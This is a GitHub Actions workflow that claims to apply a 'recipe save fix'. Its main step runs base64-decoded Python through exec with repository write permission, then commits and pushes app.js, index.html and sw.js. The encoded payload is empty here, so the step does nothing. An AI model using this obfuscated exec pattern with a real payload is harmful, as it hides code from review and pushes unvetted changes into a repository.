name: Recipe save fix 12.8
on:
  push:
    paths:
      - '.github/workflows/apply-save-hotfix.yml'
permissions:
  contents: write
jobs:
  hotfix:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply save fix
        run: python3 -c "import base64;exec(base64.b64decode(''))"
      - name: Verify syntax
        run: node --check app.js
      - name: Commit
        run: |
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add app.js index.html sw.js
          git commit -m '12.8 fix recipe saving'
          git push
